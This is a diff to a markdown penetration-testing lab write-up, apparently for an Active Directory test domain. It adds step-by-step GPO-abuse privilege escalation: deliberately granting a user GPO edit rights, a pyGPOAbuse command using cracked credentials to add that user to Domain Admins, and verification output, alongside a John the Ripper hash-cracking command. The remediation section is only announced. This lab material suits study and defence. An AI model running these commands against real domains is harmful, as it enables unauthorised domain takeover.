@@ -101,7 +101,9 @@ To recover the plain-text password, the captured hash was saved into a file name
 `echo '$krb5asrep$23$victim.asrep@COMPANY.LOCAL:e90755652996c5c43fd1db326f51b5f3$c2f0f950d91397196...[REDACTED]...2cb82d' > hashes.asrep`
 
 ### Cracking the hash
-`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asrep`
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asrep
+```
 
 #### The recovered hash was processed offline using `John the Ripper`. After an initial broad sweep with `rockyou.txt`, a targeted wordlist attack successfully recovered the plain-text credentials.
 
@@ -150,6 +152,62 @@ Service Account: `svc_sql`
 Recovered Password: `P@ssword123!`
 
 Status: SUCCESS.
+
+### 2.4: Privilege Escalation via GPO Abuse
+
+#### 2.4.1 Vulnerability Theory & Preparation
+Group Policy Objects (GPOs) define the security baseline for the domain. If an administrative account delegates "Edit" or "Full Control" permissions of a GPO to a non-privileged user, that user can modify the policy to execute arbitrary code on any system where the GPO is applied.
+
+#### Pre-Attack Setup (Executed on DC01)
+To stage the environment, a new GPO was created and linked to the domain root. Crucially, the compromised user `victim.asrep` was granted the `GpoEditDeleteModifySecurity` permission level.
+```PowerShell
+# 1. Create a new GPO for the attack simulation
+New-GPO -Name "Vulnerable_Policy" -Comment "Corporate Software Deployment Policy"
+
+# 2. Link the GPO to the domain root to maximize impact
+New-GPLink -Name "Vulnerable_Policy" -Target "dc=company,dc=local"
+
+# 3. Grant the compromised user full modification rights (The Misconfiguration)
+Set-GPPermissions -Name "Vulnerable_Policy" -PermissionLevel GpoEditDeleteModifySecurity -TargetName "victim.asrep" -TargetType User
+```
+#### 2.4.2 Technical Hurdles & Troubleshooting
+During the exploitation phase, several issues were encountered that required technical pivots:
+## Issues, Observations, and Resolutions
+
+| Issue | Observation | Resolution |
+|------|------------|------------|
+| Tool Availability | pyGPOAbuse was not pre-installed on Kali Linux. | Cloned the official repository from GitHub and manually installed the tool's requirements. |
+| Dependency Conflict | Python PEP 668 blocked `pip install` due to an "externally managed environment" error. | Utilized the `--break-system-packages` flag to bypass the restriction for rapid lab deployment. |
+| Execution Failure | The initial attempt to create a new user via `net user` failed to trigger/populate. | Pivoted to adding the existing `victim.asrep` user directly to the **Domain Admins** group. |
+| Environment Context | Standard CMD commands were inconsistent or failed to execute within the GPO XML structure. | Switched to the `-powershell` flag and `-user-as-admin` to force execution within a high-integrity SYSTEM context. |
+
+#### 2.4.3 Successful Exploitation (Executed on Kali)
+After identifying the correct GPO ID and adjusting the payload for better compatibility, the following command was executed from the attack node:
+```Bash
+# Final successful command using PowerShell and SYSTEM context elevation
+python3 pygpoabuse.py company.local/victim.asrep:'P@ssword123!' \
+  -dc-ip 192.168.0.25 \
+  -gpo-id "6ead850e-4655-4cde-a48e-80e81aac05fe" \
+  -powershell \
+  -command "Add-ADGroupMember -Identity 'Domain Admins' -Members 'victim.asrep'" \
+  -taskname "GlobalSync" \
+  -user-as-admin
+  ```
+#### 2.4.4 Verification & Domain Compromise
+To bypass the default GPO refresh interval (90 minutes), a manual update was forced on the Domain Controller.
+```PowerShell
+# Force immediate policy application
+gpupdate /force
+
+# Verify membership in the high-privileged group
+net group "Domain Admins" /domain
+```
+#### Final Evidence of Success: The output confirmed that `victim.asrep` had successfully escalated from a standard domain user to a Domain Administrator:
+#### Members
+-------------------------------------------------------------------------------
+Administrator -------------- victim.asrep
+
+The command completed successfully.
 
 ## Phase 3: Hardening and Remediation
 This section will contain the security controls and PowerShell scripts required to remediate the identified vulnerabilities and monitor for similar attack patterns.
